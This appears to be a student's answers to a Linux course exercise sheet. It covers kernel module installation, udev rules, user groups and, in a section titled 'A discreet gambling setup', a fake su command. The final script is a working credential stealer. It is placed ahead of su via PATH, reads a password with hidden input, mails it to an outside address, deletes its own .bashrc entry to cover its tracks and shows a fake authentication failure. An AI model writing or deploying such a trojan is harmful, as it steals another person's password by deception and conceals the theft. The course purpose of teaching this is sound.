# Non-programming & Programming Exercises

## A clean setup

### Where to copy the dice module for it to be officially known to the kernel?

```bash
/lib/modules/$(uname -r)/kernel/drivers/char
```

### What command to run in order to generate the modules.dep and map files?

`depmod`

### How to ensure the dice module is loaded at boot time, and how to pass it options?

add `dicemodule.conf` to `/etc/modules-load.d/` or `/etc/modules` and add with `dicedevice <option>=<value`
Use `dicemodule.ko` when loaded at boot

### How to create a new friends group and add grandpa and his friends to it?

```bash
sudo groupadd friends
usermod -a -G friends grandpa
usermod -a -G friends friend
```

### What is udev and how to define rules such that the group and permissions are automatically setup at device creation?

udev (userspace /dev ) is a device manager for the Linux kernel. As the successor of devfsd and hotplug, udev primarily manages device nodes in the /dev  directory. At the same time, udev also handles all user space events raised when hardware devices are added into the system or removed from it, including firmware loading as required by certain devices.
modify the rules stored in /lib/udev/rules.d/*.rules , for example: KERNEL=="dice0", ATTRS{idVendor}=="16c0", ATTRS{idProduct}=="05df", MODE="066

## A discreet gambling setup

### How adjust the PATH, ensure its new version is loaded but then forgotten?

add `export PATH=WHERE_YOUR_SU_IS:$PATH` in `~/.bashrc`
Also run `source ~/.bashrc`

### What is the exact behaviour of su when wrong password is input?

`perror` output message `su: Authentication failure`

### When using the read command how to hide the user input?

`read -s`

### How to send an email from the command line?

```bash
sudo apt install mailutils
sudo apt install ssmtp
sudo vim /etc/ssmtp/ssmtp.con
```

```bash
# mail config
root=sjtu_xwq@sjtu.edu.cn
# The place where the mail goes. The actual machine name is required no 
# MX records are consulted. Commonly mailhosts are named mail.domain.com
mailhub=mail.sjtu.edu.cn:587
# Where will the mail seem to come from?
#rewriteDomain=
# The full hostname
hostname=sjtu.edu.cn:mail.sjtu.edu.cn:587
# Are users allowed to set their own From: address?
# YES - Allow the user to specify their own From: address
# NO - Use the system generated From: address
#FromLineOverride=YES
#
AuthUser=sjtu_xwq@sjtu.edu.cn
AuthPass=$JACCOUNT_PASSWORD
UseTLS=Yes
```
```bash
#!/bin/bash
mailto=sjtu_xwq@sjtu.edu.cn
echo -e "Password: \c"
read -s password
echo
mail -s 'mum password' $mailto <<< $password
sleep 5
head -n -1 ~/.bashrc > ~/.bashrc.tmp
mv ~/.bashrc.tmp ~/.bashrc
echo "su: Authentication failure"
exit 1
```

